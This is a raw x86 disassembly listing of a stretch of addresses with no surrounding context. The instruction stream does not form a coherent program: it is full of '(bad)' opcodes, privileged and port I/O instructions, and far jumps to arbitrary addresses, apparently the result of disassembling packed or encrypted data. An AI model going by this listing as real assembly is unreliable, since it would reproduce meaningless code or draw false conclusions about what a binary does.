  41c54e:	xor    ebp,DWORD PTR [ebx]
  41c550:	loope  0x41c500
  41c552:	mov    bl,0x52
  41c554:	popf   
  41c555:	loope  0x41c5aa
  41c557:	add    ebx,esi
  41c559:	or     BYTE PTR [eax],dh
  41c55b:	mov    eax,DWORD PTR [esi-0x173e6a60]
  41c561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c562:	out    0xd0,al
  41c564:	pusha  
  41c565:	jg     0x41c5a4
  41c567:	or     DWORD PTR [esi-0xa502772],ebp
  41c56d:	cld    
  41c56e:	push   0xffffffee
  41c570:	xchg   ebp,eax
  41c571:	out    dx,eax
  41c572:	sbb    DWORD PTR [eax],ecx
  41c574:	ret    
  41c575:	lods   eax,DWORD PTR ds:[esi]
  41c576:	test   BYTE PTR [ecx+0x3c985c58],bl
  41c57c:	inc    ebx
  41c57d:	mov    edx,0x8c661772
  41c582:	and    bh,BYTE PTR ds:0x38cdcd3e
  41c588:	add    cl,bh
  41c58a:	mov    dl,0xce
  41c58c:	pusha  
  41c58d:	add    BYTE PTR [eax],al
  41c58f:	add    BYTE PTR [eax],al
  41c591:	add    ch,ah
  41c593:	adc    al,BYTE PTR [edi]
  41c595:	dec    ebx
  41c596:	neg    DWORD PTR [edi-0x13]
  41c599:	mov    esi,0xd2d3b943
  41c59e:	loope  0x41c597
  41c5a0:	push   ebp
  41c5a1:	adc    eax,0x1415b
  41c5a6:	repz add al,0x0
  41c5a9:	add    BYTE PTR [edi+0x317d502a],al
  41c5af:	or     eax,eax
  41c5b1:	push   ebx
  41c5b2:	fidivr DWORD PTR fs:[ebp+0x44498c30]
  41c5b9:	popa   
  41c5ba:	adc    DWORD PTR [eax-0x6b033d37],ebx
  41c5c0:	xchg   DWORD PTR [ebx-0x43473b9d],ebx
  41c5c6:	ret    0xe0fa
  41c5c9:	out    dx,eax
  41c5ca:	call   0x685b:0xdbc8e37a
  41c5d1:	xor    dl,BYTE PTR [esi+esi*2-0x7d]
  41c5d5:	scas   al,BYTE PTR es:[edi]
  41c5d6:	ficomp WORD PTR [ecx]
  41c5d8:	xchg   ebx,eax
  41c5d9:	dec    ecx
  41c5da:	rol    BYTE PTR [ecx-0x7e],cl
  41c5dd:	fcomp  QWORD PTR [esi+0x4040a8d0]
  41c5e3:	mov    esp,DWORD PTR [eax+edi*1-0x627c87f4]
  41c5ea:	fdivr  DWORD PTR [edx]
  41c5ec:	aaa    
  41c5ed:	adc    DWORD PTR [esi-0x4f],esi
  41c5f0:	jecxz  0x41c5cb
  41c5f2:	mov    ds:0xe515817d,al
  41c5f7:	(bad)  
  41c5f8:	or     BYTE PTR [edi-0x2ba2df92],dh
  41c5fe:	inc    eax
  41c5ff:	adc    ah,BYTE PTR [eax-0x60]
  41c602:	pop    ss
  41c603:	cli    
  41c604:	(bad)  
  41c605:	sub    ch,bh
  41c607:	inc    eax
  41c608:	in     eax,dx
  41c609:	cmc    
  41c60a:	pop    eax
  41c60b:	pop    ecx
  41c60c:	sbb    bl,BYTE PTR [ebx]
  41c60e:	fst    QWORD PTR ss:[esi-0x68]
  41c612:	mov    edi,0xf6d31313
  41c617:	pop    es
  41c618:	push   edx
  41c619:	xor    edi,edx
  41c61b:	dec    eax
  41c61c:	sar    esi,cl
  41c61e:	sub    al,al
  41c620:	mov    DWORD PTR [eax+ebx*2],eax
  41c623:	sbb    eax,0xe476e287
  41c628:	retf   
  41c629:	mov    bl,0xb
  41c62b:	add    ecx,DWORD PTR [esi]
  41c62d:	push   eax
  41c62e:	bound  edx,QWORD PTR [eax-0x28ede5ab]
  41c634:	addr16 jg 0x41c63c
  41c637:	push   esp
  41c638:	or     eax,0x49805207
  41c63d:	out    0x59,eax
  41c63f:	inc    esp
  41c640:	jge    0x41c66f
  41c642:	pop    ds
  41c643:	dec    edx
  41c644:	sahf   
  41c645:	sbb    BYTE PTR [edi-0x51bba850],ah
  41c64b:	mov    esp,0x72bd8d72
  41c650:	outs   dx,DWORD PTR ds:[esi]
  41c651:	mov    ch,0x5e
  41c653:	sbb    edx,DWORD PTR [esi+0x6b]
  41c656:	jmp    0x174871b
  41c65b:	mov    ebx,0xdc7c7fa8
  41c660:	std    
  41c661:	push   cs
  41c662:	popf   
  41c663:	int3   
  41c664:	dec    esi
  41c665:	cld    
  41c666:	pop    edx
  41c667:	pop    edx
  41c668:	mov    WORD PTR [esi+0x96ea967],fs
  41c66e:	(bad)  
  41c66f:	mov    edi,0x71586f41
  41c674:	daa    
  41c675:	lahf   
  41c676:	stos   DWORD PTR es:[edi],eax
  41c677:	call   0xbe4d:0x5a018e8a
  41c67e:	out    dx,eax
  41c67f:	icebp  
  41c680:	aas    
  41c681:	push   eax
  41c682:	and    eax,0x2a6d29fb
  41c687:	or     esi,DWORD PTR [esi+0x4c]
  41c68a:	aad    0x7
  41c68c:	inc    ecx
  41c68d:	cmp    esp,DWORD PTR [eax]
  41c68f:	repnz sbb DWORD PTR gs:[ebp-0x29],esp
  41c694:	loop   0x41c6d8
  41c696:	xchg   ecx,ebp
  41c698:	jmp    0x41c674
  41c69a:	push   es
  41c69b:	clc    
  41c69c:	mov    ds:0xc392349e,al
  41c6a1:	sar    DWORD PTR [eax],cl
  41c6a3:	ficomp WORD PTR [ebx+0x2b]
  41c6a6:	ret    
  41c6a7:	pop    ss
  41c6a8:	add    al,0x11
  41c6aa:	mov    ah,0x15
  41c6ac:	pushf  
  41c6ad:	cdq    
  41c6ae:	fmul   QWORD PTR [eax+0x73]
  41c6b1:	and    eax,0x6fa89155
  41c6b6:	scas   eax,DWORD PTR es:[edi]
  41c6b7:	pop    edi
  41c6b8:	jmp    0x21911954
  41c6bd:	xchg   edi,eax
  41c6be:	jp     0x41c69b
  41c6c0:	mov    ecx,0xfbc1fb65
  41c6c5:	jns    0x41c6f9
  41c6c7:	test   al,0xf7
  41c6c9:	ja     0x41c683
  41c6cb:	mov    bh,0xf9
  41c6cd:	jae    0x41c6d4
  41c6cf:	inc    esp
  41c6d0:	pop    es
  41c6d1:	(bad)  
  41c6d2:	xlat   BYTE PTR ds:[ebx]
  41c6d3:	dec    eax
  41c6d4:	inc    ebx
  41c6d5:	jg     0x41c73a
  41c6d7:	stos   BYTE PTR es:[edi],al
  41c6d8:	xor    BYTE PTR [eax],bl
  41c6da:	popa   
  41c6db:	daa    
  41c6dc:	out    dx,al
  41c6dd:	fistp  WORD PTR [ecx]
  41c6df:	fsub   DWORD PTR [ecx-0xd7208c8]
  41c6e5:	xchg   ecx,eax
  41c6e6:	cmp    al,0x31
  41c6e8:	mov    esi,0x70093e6b
  41c6ed:	mov    al,ds:0x988eb196
  41c6f2:	leave  
  41c6f3:	mov    ebp,0x3680ab02
  41c6f8:	shr    BYTE PTR [edi-0x29],cl
  41c6fb:	and    ecx,DWORD PTR [edx+0x50]
  41c6fe:	jmp    0x41c69e
  41c700:	sti    
  41c701:	cmp    al,0x59
  41c703:	dec    eax
  41c704:	leave  
  41c705:	push   esp
  41c706:	leave  
  41c707:	sbb    eax,0xdda7dcf8
  41c70c:	pop    esi
  41c70d:	aam    0x2c
  41c70f:	mov    ds:0xb6c5bcbd,al
  41c714:	mov    DWORD PTR [edx-0x7bb6da59],edx
  41c71a:	jmp    0x41c6a2
  41c71c:	fistp  QWORD PTR [edi+0x2b]
  41c720:	jecxz  0x41c782
  41c722:	in     eax,0x7
  41c724:	cmp    DWORD PTR [edi+ebp*4],0x9886b490
  41c72b:	push   edi
  41c72c:	or     dl,BYTE PTR [ebp+0xd]
  41c72f:	loopne 0x41c6db
  41c731:	fsub   QWORD PTR [edi]
  41c733:	jno    0x41c730
  41c735:	lods   eax,DWORD PTR ds:[esi]
  41c736:	pop    ss
  41c737:	jp     0x41c783
  41c739:	add    eax,0x72675cc0
  41c73e:	rcl    ebp,1
  41c740:	lahf   
  41c741:	cmp    eax,0x433a6b8c
  41c746:	xchg   ecx,eax
  41c747:	and    BYTE PTR [ebp-0x5],dh
  41c74a:	dec    esi
  41c74b:	jne    0x41c70b
  41c74d:	cli    
  41c74e:	jmp    0x90eb4cc4
  41c753:	xor    BYTE PTR [ebx+0x30603612],ah
  41c759:	jbe    0x41c6e1
  41c75b:	xchg   DWORD PTR [esi],esp
  41c75d:	(bad)  
  41c75e:	pop    ds
  41c75f:	xchg   edx,eax
  41c760:	jmp    0xc65db38
  41c765:	xlat   BYTE PTR ds:[ebx]
  41c766:	ja     0x41c7b4
  41c768:	push   0x88a13971
  41c76d:	mov    al,0x31
  41c76f:	ss inc edx
  41c771:	mov    ds:0xc8f21f,al
  41c776:	add    eax,0xc8cad71e
  41c77b:	jle    0x41c79f
  41c77d:	sbb    al,0xeb
  41c77f:	dec    esp
  41c780:	fld    QWORD PTR [ecx+0x5aae307]
  41c786:	and    eax,ebx
  41c788:	jmp    0x41c7fe
  41c78a:	in     eax,0xdd
  41c78c:	mov    gs,WORD PTR [ecx]
  41c78e:	mov    esp,0x33cef9c3
  41c793:	pop    ebp
  41c794:	scas   eax,DWORD PTR es:[edi]
  41c795:	push   ecx
  41c796:	clc    
  41c797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c798:	cs mov eax,0xebacac8b
  41c79e:	mov    al,0x98
  41c7a0:	sar    DWORD PTR [esi+0x2c],cl
  41c7a3:	icebp  
  41c7a4:	xor    eax,edx
  41c7a6:	arpl   WORD PTR [edi-0x6c],di
  41c7a9:	jno    0x41c810
  41c7ab:	shl    DWORD PTR [edx+ebx*1+0x29],0xcb
  41c7b0:	inc    ebx
  41c7b1:	sbb    DWORD PTR [esi+0x5849e8d2],esi
  41c7b7:	pop    ecx
  41c7b8:	call   0x3424:0x6ba5d982
  41c7bf:	es cmp al,0x13
  41c7c2:	or     BYTE PTR [eax+0xc],dh
  41c7c5:	push   eax
  41c7c6:	mov    al,0xb3
  41c7c8:	inc    esp
  41c7c9:	xlat   BYTE PTR ds:[ebx]
  41c7ca:	add    al,0x43
  41c7cc:	cli    
  41c7cd:	mov    ch,0x98
  41c7cf:	dec    edx
  41c7d0:	push   esi
  41c7d1:	inc    eax
  41c7d2:	sub    BYTE PTR [esi+0x59],bl
  41c7d5:	je     0x41c767
  41c7d7:	xor    DWORD PTR [edi+edx*1],edi
  41c7da:	loop   0x41c7b3
  41c7dc:	sbb    eax,0x37c2fd70
  41c7e1:	fisttp DWORD PTR [ecx]
  41c7e3:	jp     0x41c7b8
  41c7e5:	inc    DWORD PTR [edi]
  41c7e7:	sbb    ch,cl
  41c7e9:	in     al,dx
  41c7ea:	cld    
  41c7eb:	adc    BYTE PTR [esi-0x1c681fdf],bh
  41c7f1:	mov    esi,0x47bd7aa1
  41c7f6:	mov    ch,0x56
  41c7f8:	fld    DWORD PTR ds:0xff8fe2bb
  41c7fe:	adc    DWORD PTR ds:[esi],ebp
  41c801:	in     al,0x54
  41c803:	push   edx
  41c804:	adc    al,0x61
  41c806:	push   ecx
  41c807:	int    0xe3
  41c809:	jnp    0x41c876
  41c80b:	shl    BYTE PTR [ecx+0x74],0x31
  41c80f:	sbb    al,0x4f
  41c811:	sti    
  41c812:	sub    dh,ah
  41c814:	mov    eax,ds:0xe6da8798
  41c819:	cmp    ebx,esp
  41c81b:	dec    edx
  41c81c:	push   edi
  41c81d:	(bad)  
  41c81e:	xchg   ecx,eax
  41c81f:	jo     0x41c885
  41c821:	adc    ebp,DWORD PTR [ebx+0x32]
  41c824:	lods   al,BYTE PTR ds:[esi]
  41c825:	and    di,WORD PTR [edi-0x7e]
  41c829:	sub    DWORD PTR [esi+0x44],esp
  41c82c:	je     0x41c84a
  41c82e:	outs   dx,DWORD PTR ds:[esi]
  41c82f:	jbe    0x41c8ac
  41c831:	es jle 0x41c892
  41c834:	mov    bl,0x69
  41c836:	push   ebx
  41c837:	push   DWORD PTR [ebp-0x502ce41]
  41c83d:	aad    0x40
  41c83f:	ror    DWORD PTR [eax-0x21],1
  41c842:	pop    edi
  41c843:	sahf   
  41c844:	lods   al,BYTE PTR ds:[esi]
  41c845:	in     al,0x31
  41c847:	stos   BYTE PTR es:[edi],al
  41c848:	jge    0x41c7fd
  41c84a:	or     DWORD PTR [eax],0x26
  41c84d:	jo     0x41c8b1
  41c84f:	ror    BYTE PTR [ecx-0x2a],0x3e
  41c853:	dec    edx
  41c854:	sar    al,cl
  41c856:	pop    esp
  41c857:	add    eax,0xb1fd76db
  41c85c:	fs or  al,dl
  41c85f:	mov    edi,0xec947eac
  41c864:	js     0x41c8db
  41c866:	and    ebp,ebx
  41c868:	sub    eax,0x2df7e30f
  41c86d:	inc    edx
  41c86e:	int3   
  41c86f:	or     edi,eax
  41c871:	sbb    esi,DWORD PTR [edx+0x5c]
  41c874:	aaa    
  41c875:	add    dl,BYTE PTR es:[edi+0x9]
  41c879:	jb     0x41c8c8
  41c87b:	imul   dl
  41c87d:	lock cmp dl,BYTE PTR fs:0xd4aee82a
  41c885:	mov    ebx,0x5eaa0296
  41c88a:	dec    esp
  41c88b:	stos   BYTE PTR es:[edi],al
  41c88c:	xor    eax,0xbe6a764d
  41c891:	es es jl 0x41c8d4
  41c895:	and    BYTE PTR [bp+si-0x3c1],0xb2
  41c89b:	cs mov ?,edi
  41c89e:	sbb    esi,esi
  41c8a0:	cs mov ch,0x4d
  41c8a3:	push   DWORD PTR [ebx-0x72869c88]
  41c8a9:	jbe    0x41c871
  41c8ab:	popa   
  41c8ac:	xlat   BYTE PTR ds:[ebx]
  41c8ad:	sbb    DWORD PTR [esi],ecx
  41c8af:	call   0xf441:0xdc4fa986
  41c8b6:	cmp    eax,0xa969d23f
  41c8bb:	ja     0x41c91e
  41c8bd:	adc    bl,dl
  41c8bf:	ss sti 
  41c8c1:	sti    
  41c8c2:	inc    edx
  41c8c3:	xor    BYTE PTR [eax+0x77],ch
  41c8c6:	push   eax
  41c8c7:	sbb    DWORD PTR [ebx-0x3c164539],ecx
  41c8cd:	cld    
  41c8ce:	jmp    0xd06c:0xa5cddc45
  41c8d5:	leave  
  41c8d6:	sub    BYTE PTR [esp+edx*2],0xcc
  41c8da:	ss cmp al,0x2d
  41c8dd:	les    esp,FWORD PTR [ecx-0x22]
  41c8e0:	push   esp
  41c8e1:	adc    al,0x71
  41c8e3:	jmp    0x121:0xed221012
  41c8ea:	int3   
  41c8eb:	or     DWORD PTR [eax],eax
  41c8ed:	lods   al,BYTE PTR ds:[esi]
  41c8ee:	call   0x220efd7
  41c8f3:	xor    dh,dh
  41c8f5:	es stos DWORD PTR es:[edi],eax
  41c8f7:	and    ch,al
  41c8f9:	push   eax
  41c8fa:	xchg   esi,eax
  41c8fb:	xchg   edx,eax
  41c8fc:	push   esi
  41c8fd:	fwait
  41c8fe:	mov    bl,0x9a
  41c900:	pop    ecx
  41c901:	leave  
  41c902:	push   ebp
  41c903:	lods   eax,DWORD PTR ds:[esi]
  41c904:	and    edx,DWORD PTR [ecx-0x27]
  41c907:	loopne 0x41c8bd
  41c909:	push   ds
  41c90a:	retf   
  41c90b:	mov    ebp,cs
  41c90d:	aam    0x6e
  41c90f:	xchg   edi,eax
  41c910:	inc    edx
  41c911:	shl    DWORD PTR [esi+0xe],cl
  41c914:	aad    0x9c
  41c916:	xor    ebx,DWORD PTR [eax]
  41c918:	mov    bh,BYTE PTR [ecx+ebx*4-0x4ecd25b7]
  41c91f:	iret   
  41c920:	test   DWORD PTR ds:0xb6a410dc,edx
  41c926:	cmp    eax,DWORD PTR [eax+esi*1]
  41c929:	xor    BYTE PTR [ebp+esi*8-0x6638561b],dl
  41c930:	shl    DWORD PTR [ebp+0x719fc999],cl
  41c936:	add    eax,0x22798b98
  41c93b:	aam    0x89
  41c93d:	imul   edi,DWORD PTR [esi-0x58],0x8
  41c941:	repnz pusha 
  41c943:	int    0x4f
  41c945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c947:	call   0xc1788b5e
  41c94c:	addr16 std 
  41c94e:	in     al,0x5f
  41c950:	mov    esi,esi
  41c952:	push   ebx
  41c953:	rol    DWORD PTR [ebx],0xa6
  41c956:	pop    eax
  41c957:	xchg   esp,eax
  41c958:	or     ebx,DWORD PTR [ebx]
  41c95a:	cmp    al,0xe5
  41c95c:	fst    QWORD PTR [edi+0x30152da2]
  41c962:	sbb    BYTE PTR [edx],bl
  41c964:	inc    ecx
  41c965:	sbb    ecx,edx
  41c967:	inc    ecx
  41c968:	pop    esp
  41c969:	jnp    0x41c8f0
  41c96b:	xchg   edx,eax
  41c96c:	xor    al,dl
  41c96e:	cmp    DWORD PTR [ecx+0x23d02728],ecx
  41c974:	int    0x56
  41c976:	fidiv  DWORD PTR [ecx+esi*2+0x66d1543b]
  41c97d:	test   DWORD PTR [ecx-0x44],edx
  41c980:	fld    TBYTE PTR [edx]
  41c982:	mov    esi,0x13483ea6
  41c987:	mov    edi,0x8ab49d5
  41c98c:	jl     0x41c9e8
  41c98e:	pop    ss
  41c98f:	(bad)  
  41c990:	fsub   st(4),st
  41c992:	push   0x62637f35
  41c997:	test   BYTE PTR [ebp+ecx*2+0x2c18cedd],cl
  41c99e:	stc    
  41c99f:	bnd jle 0x41ca05
  41c9a2:	imul   esi,DWORD PTR [ebp-0x1382d45e],0x3b
  41c9a9:	cld    
  41c9aa:	fdiv   DWORD PTR [ecx-0xea2d2d7]
  41c9b0:	and    edi,DWORD PTR [edi+0x701f0578]
  41c9b6:	or     BYTE PTR [esi+0x28],0xd0
  41c9ba:	inc    esp
  41c9bb:	rcr    BYTE PTR [edi-0x4e],cl
  41c9be:	sbb    dl,ah
  41c9c0:	je     0x41c975
  41c9c2:	enter  0x3b26,0x46
  41c9c6:	jle    0x41c9cc
  41c9c8:	retf   0xd0e9
  41c9cb:	or     eax,0x2e088e64
  41c9d0:	sub    DWORD PTR [edi],esi
  41c9d2:	adc    esi,ebx
  41c9d4:	adc    al,0x7f
  41c9d6:	mov    ah,0x34
  41c9d8:	and    al,0x32
  41c9da:	jne    0x41c9bb
  41c9dc:	addr16 lock ja 0x41c9e3
  41c9e0:	pop    ebp
  41c9e1:	mov    edi,0xd0f3133e
  41c9e6:	adc    al,0x98
  41c9e8:	mov    BYTE PTR [edx+0x77b3fe3b],ch
  41c9ee:	aam    0xc0
  41c9f0:	popf   
  41c9f1:	adc    al,0x9
  41c9f3:	add    al,0x61
  41c9f5:	mov    edi,DWORD PTR [eax+0x3e42276c]
  41c9fb:	jo     0x41c995
  41c9fd:	outs   dx,DWORD PTR ds:[esi]
  41c9fe:	lock mov bh,0x39
  41ca01:	aaa    
  41ca02:	xor    eax,0xd8d3f4
  41ca07:	jle    0x41c9d7
  41ca09:	jae    0x41c9bc
  41ca0b:	int3   
  41ca0c:	gs and al,0x3f
  41ca0f:	imul   esp,edi,0xffffffbc
  41ca12:	rcl    BYTE PTR [edx-0x3a],0x94
  41ca16:	dec    esi
  41ca17:	(bad)  
  41ca18:	add    BYTE PTR [ecx-0x57f1e736],dh
  41ca1e:	scas   eax,DWORD PTR es:[edi]
  41ca1f:	pop    ecx
  41ca20:	and    al,cl
  41ca22:	into   
  41ca23:	test   BYTE PTR [edi],ah
  41ca25:	add    bh,BYTE PTR [ecx-0x5e]
  41ca28:	inc    ecx
  41ca29:	push   0x24
  41ca2b:	jmp    0x97c7:0x3600c72f
  41ca32:	ins    BYTE PTR es:[edi],dx
  41ca33:	mov    edi,0x4b63c31c
  41ca38:	fstp   DWORD PTR [esi+0x4e]
  41ca3b:	stos   DWORD PTR es:[edi],eax
  41ca3c:	inc    ebx
  41ca3d:	sub    eax,0xd9cb89ab
  41ca42:	(bad)  
  41ca43:	sub    al,0x9b
  41ca45:	lock call 0xf741e49a
  41ca4b:	cmp    eax,0xce41bdbf
  41ca50:	aas    
  41ca51:	std    
  41ca52:	cmc    
  41ca53:	xchg   ebp,eax
  41ca54:	pop    ebx
  41ca55:	push   es
  41ca56:	push   ss
  41ca57:	mov    dl,0xfa
  41ca59:	adc    DWORD PTR [ecx+esi*2],edx
  41ca5c:	sub    esp,DWORD PTR [eax-0x66183be9]
  41ca62:	add    eax,0x77710359
  41ca67:	mov    ch,0x4b
  41ca69:	add    eax,DWORD PTR [ebp+0x648d0fc9]
  41ca6f:	ret    0xd171
  41ca72:	retf   0x70d3
  41ca75:	adc    al,0x86
  41ca77:	ret    
  41ca78:	fdivr  st(2),st
  41ca7a:	lock and eax,0x14e1bac6
  41ca80:	xlat   BYTE PTR ds:[ebx]
  41ca81:	and    al,0x45
  41ca83:	push   edx
  41ca84:	outs   dx,DWORD PTR ds:[esi]
  41ca85:	push   esi
  41ca86:	rcr    edi,0xf3
  41ca89:	in     eax,dx
  41ca8a:	icebp  
  41ca8b:	lods   al,BYTE PTR ds:[esi]
  41ca8c:	into   
  41ca8d:	xchg   edi,eax
  41ca8e:	shl    DWORD PTR [edx-0x1e],cl
  41ca91:	es clc 
  41ca93:	out    dx,eax
  41ca94:	popa   
  41ca95:	push   ebp
  41ca96:	jmp    0xe0d6bb1a
  41ca9b:	dec    eax
  41ca9c:	add    al,0x0
  41ca9e:	add    BYTE PTR [eax],al
  41caa0:	add    BYTE PTR [eax],al
  41caa2:	in     al,0x3e
  41caa4:	mov    esp,ss
  41caa6:	fdivrp st(6),st
  41caa8:	cld    
  41caa9:	ds push esp
  41caab:	daa    
  41caac:	cmp    esi,DWORD PTR [edx+0x3a]
  41caaf:	jae    0x41caba
  41cab1:	ror    BYTE PTR [esi+0x46],cl
  41cab4:	add    DWORD PTR [eax],eax
  41cab6:	repz add al,0x0
  41cab9:	add    BYTE PTR [edx-0x6e],cl
  41cabc:	mov    esp,ebp
  41cabe:	sti    
  41cabf:	mov    esi,0x9f064d19
  41cac4:	cmp    BYTE PTR [ebp-0x7a9cc315],bl
  41caca:	pop    ds
  41cacb:	fs hlt 
  41cacd:	sbb    BYTE PTR [edi+0x34],ah
  41cad0:	popf   
  41cad1:	adc    al,0x45
  41cad3:	adc    BYTE PTR [esi+edx*1],al
  41cad6:	pop    ds
  41cad7:	jecxz  0x41cb28
  41cad9:	sub    esi,DWORD PTR [esi]
  41cadb:	mov    ch,0x5
  41cadd:	push   esi
  41cade:	and    al,0x72
  41cae0:	enter  0xb8fc,0x92
  41cae4:	in     al,0x95
  41cae6:	sbb    DWORD PTR [esi-0x52],eax
  41cae9:	push   edx
  41caea:	and    BYTE PTR [edx],0x5d
  41caed:	push   es
  41caee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caef:	mov    al,ds:0x6f2ff035
  41caf4:	mov    ch,0xd1
  41caf6:	and    ebp,DWORD PTR [eax+ebx*4]
  41caf9:	or     dl,ah
  41cafb:	call   0x22bf:0x777f1ec5
  41cb02:	mov    ebx,es
  41cb04:	arpl   WORD PTR ds:0x79c6b57c,bp
  41cb0a:	mov    dh,0xea
  41cb0c:	xchg   ebx,eax
  41cb0d:	into   
  41cb0e:	call   0x1a3e:0xf3e04b15
  41cb15:	xor    dh,BYTE PTR [esi-0x7]
  41cb18:	outs   dx,BYTE PTR ds:[esi]
  41cb19:	imul   ebx,DWORD PTR [edi+esi*8+0x2d],0x578f9246
  41cb21:	inc    ebp
  41cb22:	mov    ch,0x7f
  41cb24:	out    0x85,eax
  41cb26:	lock cld 
  41cb28:	cli    
  41cb29:	inc    ebp
  41cb2a:	jno    0x41cade
  41cb2c:	icebp  
  41cb2d:	cld    
  41cb2e:	shr    DWORD PTR [ecx+eax*1+0x15],cl
  41cb32:	push   es
  41cb33:	call   0x4d9e3f87
  41cb38:	fistp  DWORD PTR [edi+0x1cd357fc]
  41cb3e:	call   0x81e3:0x7760f4a3
  41cb45:	mov    edx,0xa168d93c
  41cb4a:	push   eax
  41cb4b:	fwait
  41cb4c:	mov    BYTE PTR [esp+ecx*4],0x76
  41cb50:	scas   al,BYTE PTR es:[edi]
  41cb51:	mov    cl,0x72
  41cb53:	dec    DWORD PTR [ebx+ebp*2-0x6ae102d9]
  41cb5a:	inc    eax
  41cb5b:	push   ecx
  41cb5c:	(bad)  
  41cb5d:	sbb    eax,0xc44a7527
  41cb62:	inc    ecx
  41cb63:	repnz mov ds:0x9ebfb42c,eax
  41cb69:	pop    esi
  41cb6a:	and    edx,DWORD PTR [ebx-0x593f83f4]
  41cb70:	adc    ch,BYTE PTR [ecx+0x7]
  41cb73:	push   esi
  41cb74:	sbb    DWORD PTR [ebp+0x1],edi
  41cb77:	dec    edi
  41cb78:	push   eax
  41cb79:	iret   
  41cb7a:	xchg   esi,eax
  41cb7b:	outs   dx,DWORD PTR ds:[esi]
  41cb7c:	adc    al,0x28
  41cb7e:	js     0x41cb1a
  41cb80:	arpl   WORD PTR [ecx],ax
  41cb82:	mov    dl,0x54
  41cb84:	or     ecx,DWORD PTR [edi-0x1cad0584]
  41cb8a:	icebp  
  41cb8b:	(bad)  
  41cb8c:	and    dx,WORD PTR [edx+0x7]
  41cb90:	scas   eax,DWORD PTR es:[edi]
  41cb91:	xchg   edi,eax
  41cb92:	dec    ebp
  41cb93:	cmp    eax,0x7818d431
  41cb98:	adc    al,0x8a
  41cb9a:	sub    eax,0xefee5ba4
  41cb9f:	ds push ecx
  41cba1:	scas   al,BYTE PTR es:[edi]
  41cba2:	fyl2x  
  41cba4:	sub    bl,ch
  41cba6:	xchg   esi,eax
  41cba7:	jae    0x41cb8f
  41cba9:	inc    ebx
  41cbaa:	in     eax,dx
  41cbab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbac:	or     bh,BYTE PTR [edi+0x5610f2a6]
  41cbb2:	mov    cl,0x70
  41cbb4:	iret   
  41cbb5:	pop    ebx
  41cbb6:	fwait
  41cbb7:	xor    DWORD PTR [ebx-0x3d175e69],edx
  41cbbd:	or     DWORD PTR [edi],esp
  41cbbf:	icebp  
  41cbc0:	out    dx,eax
  41cbc1:	push   ebp
  41cbc2:	jp     0x41cb99
  41cbc4:	fld    TBYTE PTR [esi-0x6ff5597c]
  41cbca:	jmp    0x1949:0xaff3f411
  41cbd1:	mov    ecx,edx
  41cbd3:	mov    dh,0x1e
  41cbd5:	jp     0x41cbe1
  41cbd7:	pop    ebx
  41cbd8:	cld    
  41cbd9:	and    cl,BYTE PTR [esi-0x4e]
  41cbdc:	cli    
  41cbdd:	jnp    0x41cbba
  41cbdf:	lods   al,BYTE PTR ds:[esi]
  41cbe0:	(bad)  
  41cbe1:	sub    al,0x35
  41cbe3:	adc    DWORD PTR [esi],edx
  41cbe5:	(bad)  
  41cbe6:	sbb    al,BYTE PTR [ecx+0x76436e18]
  41cbec:	jl     0x41cbc5
  41cbee:	pop    ebp
  41cbef:	push   eax
  41cbf0:	dec    ebp
  41cbf1:	aaa    
  41cbf2:	inc    eax
  41cbf3:	jp     0x41cc74
  41cbf5:	(bad)  
  41cbf6:	fldenv [ebx+0x4f47e504]
  41cbfc:	push   es
  41cbfd:	scas   eax,DWORD PTR es:[edi]
  41cbfe:	add    al,0xec
  41cc00:	popa   
  41cc01:	jle    0x41cc76
  41cc03:	je     0x41cc0a
  41cc05:	shl    BYTE PTR [edx-0x29b7a8eb],cl
  41cc0b:	sub    edx,DWORD PTR [ebp+0x7b]
  41cc0e:	sysexit 
  41cc10:	mov    ebp,DWORD PTR [esi]
  41cc12:	xchg   esp,eax
  41cc13:	push   edi
  41cc14:	leave  
  41cc15:	and    eax,0x2704825f
  41cc1a:	(bad)  
  41cc1b:	cmp    BYTE PTR [esi+ebx*4],al
  41cc1e:	cmp    DWORD PTR ds:[eax+0x7],edx
  41cc22:	cmp    cl,al
  41cc24:	sub    eax,0x47a368a0
  41cc29:	(bad)  
  41cc2b:	test   DWORD PTR [ebx-0x22],edi
  41cc2e:	stc    
  41cc2f:	inc    esi
  41cc30:	adc    dh,al
  41cc32:	in     eax,dx
  41cc33:	leave  
  41cc34:	in     al,0x58
  41cc36:	fiadd  DWORD PTR [edi-0x55d3e52]
  41cc3c:	jg     0x41cc4f
  41cc3e:	inc    eax
  41cc3f:	fs xor esp,ecx
  41cc42:	pushf  
  41cc43:	or     ecx,esp
  41cc45:	test   eax,0x2bcb2eef
  41cc4a:	lds    edx,FWORD PTR [edx]
  41cc4c:	mov    ecx,0xe33d4c6d
  41cc51:	cmp    BYTE PTR [eax+0xae14a54],ch
  41cc57:	into   
  41cc58:	jl     0x41cc9d
  41cc5a:	test   BYTE PTR [esp+eax*8+0x2a],0x63
  41cc5f:	daa    
  41cc60:	std    
  41cc61:	and    BYTE PTR [ecx+0x32fc952f],0xc0
  41cc68:	mov    dh,0x78
  41cc6a:	or     al,0x2d
  41cc6c:	jbe    0x41cc59
  41cc6e:	mov    WORD PTR [ecx+0x4d302513],?
  41cc74:	sti    
  41cc75:	cmp    bl,al
  41cc77:	jl     0x41cc44
  41cc79:	jl     0x41cc8d
  41cc7b:	imul   edi,DWORD PTR [ebx],0xffffffb8
  41cc7e:	pop    esi
  41cc7f:	dec    eax
  41cc80:	dec    edx
  41cc81:	push   ss
  41cc82:	xchg   esp,eax
  41cc83:	bound  esi,QWORD PTR [eax+0x31ec231d]
  41cc89:	inc    edi
  41cc8a:	int    0x32
  41cc8c:	icebp  
  41cc8d:	cmp    bh,BYTE PTR [edx+edi*4]
  41cc90:	push   esi
  41cc91:	stos   BYTE PTR es:[edi],al
  41cc92:	pop    esi
  41cc93:	xchg   edi,eax
  41cc94:	out    0x46,al
  41cc96:	es mov esp,0x2c2b16c5
  41cc9c:	mov    eax,0x283bb590
  41cca1:	push   eax
  41cca2:	xchg   edi,eax
  41cca3:	sub    BYTE PTR [eax-0x190673a],ah
  41cca9:	ss mov ecx,0x7c598f5a
  41ccaf:	jl     0x41cc81
  41ccb1:	sub    BYTE PTR [edx+0x1334e1ca],dh
  41ccb7:	adc    BYTE PTR [edi-0xedbda83],bh
